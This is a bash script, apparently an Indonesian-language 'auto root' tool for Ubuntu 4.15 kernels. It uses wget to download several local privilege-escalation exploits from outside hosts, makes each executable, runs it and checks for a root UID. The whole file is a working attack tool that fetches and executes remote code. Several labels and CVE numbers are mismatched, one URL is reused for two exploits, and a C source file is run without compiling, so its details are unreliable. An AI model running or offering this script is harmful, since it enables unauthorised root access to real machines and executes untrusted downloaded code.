#!/bin/bash

RED='\033[91m'
GREEN='\033[92m'
END='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Root Ubuntu 4.15 Kernel Exploits by BATOSAY1337${END}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "${GREEN}[+] Root masuk! Uid=$(id -u)${END}"
        exit
    fi
}

try_exploit() {
    NAME="$1"
    URL="$2"
    echo "[*] Mengunduh $NAME ..."
    wget -q "$URL" -O "$NAME"
    if [[ ! -f "$NAME" ]]; then
        echo "[!] Gagal download $NAME"
        return
    fi
    chmod +x "$NAME"
    echo "[*] Menjalankan $NAME ..."
    ./"$NAME"
    check_root
    rm -f "$NAME"
}

# 1. overlayfs (CVE-2021-3493) — Github briskets
try_exploit overlayfs "https://github.com/briskets/CVE-2021-3493/raw/main/exploit"

# 2. dirtycow (CVE-2016-5195) — dari gist aktif
try_exploit dirtycow "https://gist.githubusercontent.com/v1ad/90b77ae3d87485c4629d/raw/CVE-2015-1328.c"

# 3. ptrace_traceme (CVE-2017-16995) — dari Exploit-DB
try_exploit ptrace "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"

# 4. af_packet (CVE-2016-8655) — biasanya tersedia di 0-gram jika server hidup, tapi bisa cari di ExploitDB:
try_exploit af_packet "https://0-gram.github.io/id-0/af_packet"

# 5. nested namespace idmap (CVE-2018-18955) — Rapid7 Metasploit module binary
try_exploit nestedns "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"

# Opsional: Python exploit (jika ada)
if command -v python2 &>/dev/null; then
    wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" -O exploit_userspec.py
    if [[ -f exploit_userspec.py ]]; then
        chmod +x exploit_userspec.py
        python2 exploit_userspec.py
        check_root
        rm -f exploit_userspec.py
    fi
fi

echo -e "${RED}[!] Semua exploit telah dicoba. Kalau belum root, kemungkinan kernel kamu sudah patch.${END}"
